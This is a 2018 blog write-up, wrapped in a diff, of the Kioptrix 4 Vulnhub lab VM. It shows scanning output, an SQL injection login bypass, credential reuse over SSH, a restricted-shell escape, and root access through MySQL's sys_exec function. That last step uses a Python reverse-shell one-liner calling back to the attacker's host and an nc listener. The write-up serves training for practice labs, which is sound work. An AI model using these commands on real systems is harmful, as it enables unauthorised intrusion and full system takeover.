@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Kioptrix 4 - Writeup</title>
+        <style>
+
+    html body {
+        font-family: '', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: green;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+<link rel="stylesheet" href="https://0x23b.github.io/css/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=">
+
+
+
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+ 
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.32.4" />
+        
+        
+        
+        
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-91628530-1"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments)};
+          gtag('js', new Date());
+
+          gtag('config', 'UA-91628530-1');
+        </script>
+        
+    </head>
+
+    
+    <script type="text/javascript" async
+      src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+
+    <body>
+        
+
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">Kioptrix 4 - Writeup</a>
+					
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="https://0x23b.github.io/">Home</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/about">About</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/tags/">Tags</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/posts/">Posts</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="https://github.com/0x23b/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/0x23b/"><i class="fa fa-twitter"></i></a></li>
+                            
+							<li class="navbar-icon"></li>
+
+                        </ul>
+						
+						<ul class="nav navbar-nav navbar-right">
+                        </ul>
+						
+						
+
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="https://0x23b.github.io/posts/vulnhub/2018-07-19-vulnhub_kioptrix_4_writeups/">Kioptrix 4 - Writeup</a></h4>
+    <h5>July 19, 2018</h5>
+    
+    <a href="https://0x23b.github.io/tags/vulnhub"><kbd class="item-tag">Vulnhub</kbd></a>
+    
+    <a href="https://0x23b.github.io/tags/writeups"><kbd class="item-tag">Writeups</kbd></a>
+    
+
+</div>
+
+
+    <br> <div class="text-justify">
+
+<h1 id="kioptrix-4-writeup">Kioptrix 4 - Writeup</h1>
+
+<h2 id="summary">Summary</h2>
+
+<p>In order to have a foothold into this machine, I had to use SQL injection. This allowed me to gather logon credentials over ssh. After logging in over ssh, I landed in a restricted shell, which was easily escaped with os.system. I discovered, that MySQL is running as root, which also allowed us to execute system commands through MySQL User Defined Functions.</p>
+
+<h2 id="netdiscover">Netdiscover</h2>
+
+<p>First of all, lets find the ip address of the vulnerable machine:</p>
+
+<pre><code class="language-bash">Currently scanning: 192.168.60.0/16   |   Screen View: Unique Hosts           
+
+ 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180               
+ _________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -------------------------------------------------------------------------
+ 192.168.63.2    08:00:27:06:9a:fa      2     120  PCS Systemtechnik GmbH      
+ 192.168.63.1    0a:00:27:00:00:0f      1      60  Unknown vendor              
+ 192.168.63.3    08:00:27:ec:b1:87      1      60  PCS Systemtechnik GmbH      
+
+</code></pre>
+
+<h2 id="nmap">Nmap</h2>
+
+<p>Now let&rsquo;s scan for open ports:</p>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/kioptrix4# nmap -sC -sV -oA nmap 192.168.63.3
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-16 13:38 EDT
+Nmap scan report for 192.168.56.12
+Host is up (0.0017s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey:
+|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
+|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+|_http-title: Ligoat Security - Got Goat? Security ...
+MAC Address: 08:00:27:40:1A:B5 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.12 seconds
+</code></pre>
+
+<h2 id="dirb">Dirb</h2>
+
+<p>We can see, that an Apache is running on the machine. This means, that we can enumerate the server for common pages and directories.</p>
+
+<pre><code class="language-bash">root@kali:~# dirb 192.168.63.3
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Jul 25 10:11:08 2018
+URL_BASE: http://192.168.63.3
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.63.3 ----
++ http://192.168.63.3/cgi-bin/ (CODE:403|SIZE:328)                                                                                            
+==&gt; DIRECTORY: http://192.168.63.3/images/                                                                                                    
++ http://192.168.63.3/index (CODE:200|SIZE:1255)                                                                                              
++ http://192.168.63.3/index.php (CODE:200|SIZE:1255)                                                                                          
+==&gt; DIRECTORY: http://192.168.63.3/john/                                                                                                      
++ http://192.168.63.3/logout (CODE:302|SIZE:0)                                                                                                
++ http://192.168.63.3/member (CODE:302|SIZE:220)                                                                                              
++ http://192.168.63.3/server-status (CODE:403|SIZE:333)                                                                                       
+
+---- Entering directory: http://192.168.63.3/images/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: http://192.168.63.3/john/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+
+-----------------
+END_TIME: Wed Jul 25 10:11:10 2018
+DOWNLOADED: 4612 - FOUND: 6
+</code></pre>
+
+<h2 id="index-php">Index.php</h2>
+
+<p>Here we see a logon page, which is vulnerable to SQL injection. While enumerating the pages, we already found the directory „john“. So lets try out this username and use SQL injection in the password field:</p>
+
+<pre><code>Username: john
+Password: ‘ or 1=1 --
+</code></pre>
+
+<p>This gives us the member’s control panel, with username and password. For „john“, the password is „MyNameIsJohn“.</p>
+
+<p>We can use this credentials with ssh, which gives us a restricted shell. But first, look for more users with wfuzz:</p>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/kioptrix4# wfuzz --sh 1 -z file,/usr/share/wordlists/rockyou.txt http://192.168.63.3/member.php?username=FUZZ
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.2.11 - The Web Fuzzer                        *
+********************************************************
+
+Target: http://192.168.63.3/member.php?username=FUZZ
+Total requests: 14344392
+
+==================================================================
+ID  Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000077:  C=302      1 L       0 W      1 Ch  &quot;robert&quot;
+006578:  C=302      1 L       0 W      1 Ch  &quot;john&quot;
+195825:  C=302      1 L       0 W      1 Ch  &quot;robert#1&quot;
+1167355:  C=200     13 L     161 W   1549 Ch      &quot;whiteout12&quot;^C
+Finishing pending requests...
+</code></pre>
+
+<p>We can see, that there is another user robert:</p>
+
+<pre><code>User: robert
+Password: ADGAdsafdfwt4gadfga==
+</code></pre>
+
+<p>Let’s logon with this user over ssh. This gives us a restricted shell, which we have to escape. This can be done with „echo os.system(‘/bin/bash‘)“.</p>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/kioptrix4# ssh robert@192.168.63.3
+robert@192.168.63.3's password:
+X11 forwarding request failed on channel 0
+Welcome to LigGoat Security Systems - We are Watching
+== Welcome LigGoat Employee ==
+LigGoat Shell is in place so you  don't screw up
+Type '?' or 'help' to get the list of allowed commands
+robert:~$ echo $SHELL
+*** forbidden path -&gt; &quot;/bin/kshell&quot;
+*** You have 0 warning(s) left, before getting kicked out.
+This incident has been reported.
+robert:~$ echo os.system('/bin/bash')
+robert@Kioptrix4:~$ id
+uid=1002(robert) gid=1002(robert) groups=1002(robert)
+</code></pre>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>With ps -auxf we can see, that mysqld is running as root user, so chances are high, that we can escalate priviliges over mysql.</p>
+
+<pre><code class="language-bash">robert@Kioptrix4:~$ ps -auxf
+…
+root      3968  0.0  0.0   1772   524 ?        S    08:09   0:00 /bin/sh /usr/bin/mysqld_safe
+root      4010  0.0  1.0 126988 16312 ?        Sl   08:09   0:01  \_ /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --port=3306
+root      4012  0.0  0.0   1700   556 ?        S    08:09   0:00  \_ logger -p daemon.err -t mysqld_safe -i -t mysqld
+…
+</code></pre>
+
+<p>I searched for mysql credentials and found those in /var/www/checklogin:</p>
+
+<pre><code class="language-bash">robert@Kioptrix4:/var/www$ cat checklogin.php
+&lt;?php
+ob_start();
+$host=&quot;localhost&quot;; // Host name
+$username=&quot;root&quot;; // Mysql username
+$password=&quot;&quot;; // Mysql password
+$db_name=&quot;members&quot;; // Database name
+$tbl_name=&quot;members&quot;; // Table name
+…
+?&gt;
+</code></pre>
+
+<p>We can use mysql with root and an empty password. Within the service, we can use MySQL User Defined Functions, which allow us to execute system commands.</p>
+
+<pre><code class="language-bash">robert@Kioptrix4:/var/www$ mysql -u root
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 10
+Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)
+
+Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
+
+mysql&gt; use mysql
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; show tables;
++---------------------------+
+| Tables_in_mysql           |
++---------------------------+
+| ...                       |
+| func                      |
+| ...                       |
++---------------------------+
+17 rows in set (0.00 sec)
+
+mysql&gt; select * from func;
++-----------------------+-----+---------------------+----------+
+| name                  | ret | dl                  | type     |
++-----------------------+-----+---------------------+----------+
+| lib_mysqludf_sys_info |   0 | lib_mysqludf_sys.so | function |
+| sys_exec              |   0 | lib_mysqludf_sys.so | function |
++-----------------------+-----+---------------------+----------+
+2 rows in set (0.00 sec)
+
+mysql&gt; select sys_exec('id');  
++----------------+
+| sys_exec('id') |
++----------------+
+| NULL           |
++----------------+
+1 row in set (0.00 sec)
+mysql&gt; \! which python
+/usr/bin/python
+mysql&gt; select sys_exec('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.63.4&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);\'';
+</code></pre>
+
+<p>Setup a nc listener and wait for the incoming shell:</p>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/kioptrix4# nc -lvnp 443
+listening on [any] 443 ...
+connect to [192.168.63.4] from (UNKNOWN) [192.168.63.3] 38712
+/bin/sh: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root)
+#
+</code></pre>
+</div>
+
+    
+    
+
+    
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
+
+        </footer>
+       
+    </body>
+
+</html>
+
